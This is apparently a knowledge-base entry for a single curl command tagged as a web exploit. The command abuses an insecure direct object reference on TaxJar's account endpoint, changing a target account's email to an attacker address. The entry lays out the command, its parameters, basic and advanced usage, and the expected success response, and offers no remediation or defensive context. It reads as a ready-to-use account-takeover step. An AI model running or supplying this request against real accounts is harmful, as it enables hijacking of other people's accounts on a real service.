---
data: >-
  curl -X POST https://app.taxjar.com/accounts/<TARGET_ACCOUNT_NUMBER> -d
  'email=attacker@example.com'
tags:
  - web
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 2b9bdc8a-cbed-4757-8f46-ca5be7d5d371
created_at: '2025-12-11T03:47:49.132Z'
updated_at: '2025-12-11T03:47:49.132Z'
verified: false
validated: true
submitted: true
---
# curl-post-email-change

## Command

```bash
curl -X POST https://app.taxjar.com/accounts/<TARGET_ACCOUNT_NUMBER> -d 'email=attacker@example.com'
```

## Description

Sends a POST request to change the email of a TaxJar account by exploiting IDOR, used in manual exploitation steps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `https://app.taxjar.com/accounts/<TARGET_ACCOUNT_NUMBER>` | Target URL with account number | Yes |
| `-d 'email=attacker@example.com'` | Payload with new email | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://app.taxjar.com/accounts/12345 -d 'email=attacker@example.com'
```

### Advanced Usage

```bash
curl -X POST https://app.taxjar.com/accounts/12345 -d 'email=attacker@example.com' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Expected Output

HTTP 200 OK response indicating successful email change.

## Related

- [[procedures/Exploit-IDOR-by-Manipulating-Account-Email-Change-Requests]]
